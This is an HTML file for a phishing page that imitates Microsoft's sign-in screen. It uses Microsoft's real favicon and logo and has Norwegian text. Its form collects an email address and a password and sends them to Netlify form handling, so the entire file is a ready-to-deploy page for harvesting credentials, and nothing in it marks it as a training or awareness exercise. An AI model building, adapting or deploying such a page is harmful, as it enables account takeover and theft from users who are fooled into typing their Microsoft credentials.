<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Microsoft login</title>
        <link rel="icon" type="image/x-icon" href="https://aadcdn.msauth.net/shared/1.0/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
        <link rel="stylesheet" href="style.css" />
    </head>
    <body style="display: grid; place-items: center; width: 100%; height: 100vh;"">
        <div class="sign-in-box">
            <form action="POST" data-netlify="true">
            <div class="row"><img class="logo" role="img" pngsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ed9c9eb0dce17d752bedea6b5acda6d9.png" svgsrc="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg"" src="https://aadcdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft"></div>
            <div class="row">
                <div role="heading" aria-level="1" class="title" data-bind="text: title">Logg på</div>
                    <div class="text">
                        <input type="email" name="email" id="email" placeholder="E-post, telefon eller Skype" />
                    </div>
                    <div class="text">
                        <input type="password" name="password" id="password" placeholder="Passord" />
                    </div>
            </div>
            <div class="row">
                <p>Ingen konto? <a href="#">Opprett en konto</a></p>
                <p><a href="#">Får du ikke tilgang til kontoen?</a></p>
            </div>
            <div class="row" style="display: flex; justify-content: flex-end">
                <input type="submit" class="primary button" value="Neste" />
            </div>
            </form>
        </div>
    </body>
</html>
